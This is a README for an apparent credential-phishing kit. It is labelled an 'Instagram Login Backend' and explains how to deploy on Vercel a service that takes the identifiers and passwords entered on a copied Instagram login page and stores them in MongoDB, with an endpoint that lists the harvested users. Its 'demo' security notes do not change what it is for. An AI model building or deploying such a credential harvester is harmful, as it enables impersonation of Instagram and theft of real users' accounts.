# Instagram Login Backend

Backend API for Instagram login page with data storage on Vercel using MongoDB.

## Setup Instructions

### 1. **Local Development**

#### Install Dependencies
```bash
npm install
```

#### Start Server
```bash
npm start
```

Server will run on `http://localhost:3000`

### 2. **MongoDB Setup**

1. Create account on [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
2. Create a new cluster
3. Get your connection string
4. Add connection string to `.env.local`:
   ```
   MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/instagram-login
   ```

### 3. **Deploy to Vercel**

#### Option A: Using Vercel CLI
```bash
npm install -g vercel
vercel
```

#### Option B: Using GitHub
1. Push code to GitHub repository
2. Go to [Vercel](https://vercel.com)
3. Import your GitHub repository
4. Add `MONGODB_URI` environment variable in Vercel settings
5. Deploy

### 4. **Environment Variables on Vercel**

In Vercel Dashboard:
1. Go to Project Settings → Environment Variables
2. Add `MONGODB_URI` with your MongoDB connection string
3. Redeploy

## API Endpoints

### POST `/api/login`
Save login credentials

**Request:**
```json
{
  "identifier": "username or email or phone",
  "password": "password123"
}
```

**Response:**
```json
{
  "message": "Login data stored successfully",
  "user": {
    "id": "mongo_object_id",
    "identifier": "username",
    "createdAt": "2024-01-01T12:00:00.000Z"
  }
}
```

### GET `/api/users`
Get all stored users (without passwords)

## File Structure

```
├── server.js              # Main Express server
├── Ig_login.html          # Frontend
├── api/
│   └── login.js          # Vercel serverless function
├── package.json
├── vercel.json           # Vercel configuration
├── .env.local            # Local environment variables
└── .gitignore
```

## Security Notes

⚠️ **Important**: This is a demo. For production:
- Hash passwords using bcrypt
- Use HTTPS only
- Add rate limiting
- Add CSRF protection
- Validate input on server-side
- Use environment variables for sensitive data
- Add authentication tokens (JWT)

## Support

For issues with MongoDB Atlas, visit: https://docs.atlas.mongodb.com/
For Vercel documentation, visit: https://vercel.com/docs
